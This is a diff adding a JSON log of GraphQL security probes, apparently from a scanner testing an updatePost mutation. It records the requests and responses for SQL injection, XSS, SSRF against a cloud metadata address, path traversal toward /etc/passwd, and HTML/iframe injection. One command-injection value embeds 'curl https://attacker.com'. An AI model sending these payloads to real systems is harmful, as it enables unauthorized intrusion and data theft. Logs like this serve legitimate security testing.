@@ -1,0 +1,389 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"101\", input: {title: \"Valid Title\", body: \"Normal content\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.792,
+    "timestamp": "2025-10-05T11:55:08.037660Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": null,
+          "title": "Valid Title",
+          "body": "Normal content"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"101\", input: {title: \"Hacked' OR 1=1;-- \", body: \"SQLi test\"}) {\n    id\n    title\n    user {\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.731,
+    "timestamp": "2025-10-05T11:55:11.312695Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": null,
+          "title": "Hacked' OR 1=1;-- ",
+          "user": {
+            "email": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"101\", input: {body: \"<script>alert('XSS')</script>\"}) {\n    id\n    comments {\n      data {\n        body\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.891,
+    "timestamp": "2025-10-05T11:55:15.175591Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": null,
+          "comments": {
+            "data": []
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"101\", input: {body: \"http://169.254.169.254/latest/meta-data\"}) {\n    id\n    user {\n      website\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.063,
+    "timestamp": "2025-10-05T11:55:18.859594Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": null,
+          "user": {
+            "website": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"101\", input: {title: \"Test; curl https://attacker.com\", body: \"Command test\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.841,
+    "timestamp": "2025-10-05T11:55:22.148752Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": null,
+          "title": "Test; curl https://attacker.com"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"101\", input: {body: \"../../../../etc/passwd\"}) {\n    id\n    user {\n      address {\n        zipcode\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.778,
+    "timestamp": "2025-10-05T11:55:25.183444Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": null,
+          "user": {
+            "address": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"101\", input: {body: \"<h1>Unauthorized Access</h1><iframe src='malicious.site'>\"}) {\n    id\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.838,
+    "timestamp": "2025-10-05T11:55:27.662803Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": null,
+          "body": "<h1>Unauthorized Access</h1><iframe src='malicious.site'>"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"0\", input: {title: \"Bypass Attempt\"}) {\n    id\n    title\n    user {\n      posts {\n        meta {\n          totalCount\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.803,
+        "timestamp": "2025-10-05T11:55:31.106280Z",
+        "response_body": {
+          "data": {
+            "updatePost": {
+              "id": null,
+              "title": "Bypass Attempt",
+              "user": {
+                "posts": {
+                  "meta": null
+                }
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.859,
+        "timestamp": "2025-10-05T11:55:31.964946Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": null,
+              "title": "Aliased Bypass",
+              "user": {
+                "albums": {
+                  "meta": null
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T11:55:31.964976Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.674,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: updatePost(id: \"0\", input: {title: \"Aliased Bypass\"}) {\n    id\n    title\n    user {\n      albums {\n        meta {\n          totalCount\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.824,
+        "timestamp": "2025-10-05T11:55:36.034966Z",
+        "response_body": {
+          "data": {
+            "updatePost": {
+              "id": null,
+              "title": "Bypass Attempt",
+              "user": {
+                "posts": {
+                  "meta": null
+                }
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.696,
+        "timestamp": "2025-10-05T11:55:36.730631Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": null,
+              "title": "Aliased Bypass",
+              "user": {
+                "albums": {
+                  "meta": null
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-05T11:55:36.730671Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.716,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updatePost {\n    mutationType {\n      name\n      fields {\n        name\n        args {\n          name\n          type {\n            name\n          }\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.854,
+    "timestamp": "2025-10-05T11:55:40.266223Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updatePost\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"101\", input: {tit1e: \"Typo Test\", b0dy: \"Suggestion check\"}) {\n    id\n    tite\n    bdy\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.839,
+    "timestamp": "2025-10-05T11:55:45.075560Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"tit1e\" is not defined by type \"UpdatePostInput\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 3,
+              "column": 33
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Field \"b0dy\" is not defined by type \"UpdatePostInput\". Did you mean \"body\"?",
+          "locations": [
+            {
+              "line": 3,
+              "column": 53
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"tite\" on type \"Post\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"bdy\" on type \"Post\". Did you mean \"body\" or \"id\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
